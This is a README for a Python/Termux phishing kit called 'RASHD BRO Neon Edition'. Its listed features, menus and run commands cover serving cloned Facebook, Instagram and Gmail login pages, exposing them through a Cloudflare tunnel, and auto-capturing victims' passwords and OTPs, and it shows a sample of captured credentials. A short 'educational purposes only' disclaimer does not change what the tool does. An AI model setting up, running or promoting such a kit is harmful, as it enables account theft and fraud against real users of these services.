# 🔥 RASHD BRO · Neon Edition v3.0

> **Developer:** v4zrashd
> **Platform:** Termux (Android) / Linux
> **Language:** Python 3.14+
> **Dependencies:** colorama, cloudflared (optional)

---

## 📋 Quick Start

```bash
cd /data/data/com.termux/files/home/storage/shared/V4ZMail-Insta-Fb-Flash/
python3 V4Zteem.py
```

---

## 🚀 Features

- **Facebook** phishing page
- **Instagram** phishing page
- **Gmail** phishing page
- **All 3 sites** in one hub
- **Localhost** mode (direct)
- **Cloudflared** tunnel mode (public URL)
- **Auto-capture** of credentials + OTP
- **Neon ASCII banner** with color animations
- **Terminal-only** mode (no Telegram bot)

---

## 📖 Menu Commands

### Site Selection (First Menu)
| Input | Action | Shortcut |
|-------|--------|----------|
| `1` | Facebook | `/fb` |
| `2` | Instagram | `/insta` |
| `3` | Gmail | `/mail` |
| `4` | All 3 Sites (Hub) | `hub` |
| `Enter` | Default (All) | — |

### Mode Selection (Second Menu)
| Input | Action | Description |
|-------|--------|-------------|
| `1` | Localhost | Serve & capture locally |
| `2` | Cloudflared | Expose via Cloudflare tunnel |
| `0` | Back | Return to site selection |

### Cloudflared Setup
```bash
pkg install cloudflared  # Install in Termux
cloudflared --version    # Verify installation
```

---

## 🔧 Configuration

### Config File Location
```
/data/data/com.termux/files/home/storage/shared/V4ZMail-Insta-Fb-Flash/v4z_config.json
```

### Config Structure
```json
{
    "chat_id": "",
    "enabled": false
}
```

---

## 📁 File Structure

```
V4ZMail-Insta-Fb-Flash/
├── V4Zteem.py           # Main script
├── README.md            # This file
├── v4z_config.json      # Configuration
├── index.html           # Hub page (generated)
├── fb.html              # Facebook clone
├── insta.html           # Instagram clone
├── mail.html            # Gmail clone
├── __pycache__/         # Python cache
└── v4zphis_*/           # Temp directories (auto-created)
```

---

## 🎨 Banner

```
  ╔═╗╔═╗╔╦╗╔═╗  ╔═╗╔═╗╔╦╗╔═╗╔╦╗
  ║║ ║║║ ║║║║╣   ║║ ║║║ ║║║║╣ ║║║
  ║╚═╝║║ ║ ║╚═╝  ║╚═╝║╚═╝║║╚═╝ ║║║
  ║   ║║ ║ ║╔═╗  ║   ║   ║║╔═╗ ║║║
  ║   ╚╝ ║ ║╚═╝  ║   ║   ║║║ ║ ║║║
  ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═╝ ╩╚═╝ ╩ ╩

[ RASHD BRO · FB/Insta/Mail ]
Developer: v4zrashd
RASHD BRO · Neon Edition v3.0
```

---

## 🖥️ Run Modes

### Localhost Mode
```
→ Serves on 127.0.0.1:PORT
→ URL: http://127.0.0.1:PORT
→ Auto port scanning if no port specified
→ Captures credentials to terminal
```

### Cloudflared Mode
```
→ Requires: cloudflared installed
→ Generates public URL via trycloudflare.com
→ URL format: https://xxxxx.trycloudflare.com/
→ Captures credentials to terminal
```

---

## 📸 Capture Display

When a victim submits credentials, the terminal shows:

```
═══════════════════════════════════════════════════
 ★ CAPTURE #1 — [FB] FB · PAGE 1 · LOGIN ★
═══════════════════════════════════════════════════
  ⏱ TIME       2026-09-28  14:30:22
  📍 FROM      192.168.1.100

  │  ACCOUNT     │  ◆ email@example.com
  │  PASSWORD    │  ★ mysecretpass
═══════════════════════════════════════════════════
```

---

## 📝 All Available Commands

### Python
```bash
python3 V4Zteem.py              # Run the tool
python3 -m pip install colorama # Install dependency
```

### Termux
```bash
pkg update && pkg upgrade       # Update packages
pkg install python              # Install Python
pkg install cloudflared         # Install Cloudflared (optional)
```

### Navigation
```
1 = Facebook    2 = Instagram    3 = Gmail    4 = All
1 = Localhost   2 = Cloudflared  0 = Back     0 (main) = Exit
```

---

## 🛠️ Troubleshooting

| Problem | Solution |
|---------|----------|
| `ModuleNotFoundError: colorama` | `pip install colorama -q` |
| `cloudflared not found` | `pkg install cloudflared` |
| `No free port` | Close other servers or specify port |
| `Port in use` | Tool auto-finds next free port |
| `File not found` | Ensure all HTML files are in same directory |

---

## 🔒 Legal Disclaimer

> ⚠️ **WARNING**: This tool is for educational purposes only.
> Unauthorized use against others is illegal.
> The developer is NOT responsible for any misuse.
> Use only on your own systems or with explicit permission.

---

## 📄 License

**RASHD BRO · Neon Edition v3.0**
Developer: v4zrashd
All rights reserved.

---

## 🔗 Quick Reference

| Command | Description |
|---------|-------------|
| `python3 V4Zteem.py` | Start the tool |
| `1` → `1` → `1` | FB + Localhost |
| `4` → `2` → Enter | All + Cloudflared |
| `0` → `0` | Exit |

---

```
 ██████╗  █████╗  ██████╗ ██╗  ██╗
██╔════╝ ██╔══██╗██╔═══██╗╚██╗██╔╝
██║  ███╗███████║██║   ██║ ╚███╔╝
██║   ██║██╔══██║██║   ██║ ██╔██╗
╚██████╔╝██║  ██║╚██████╔╝██╔╝ ██╗
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝

[RASHD BRO · Neon Edition v3.0]
Developer: v4zrashd
```
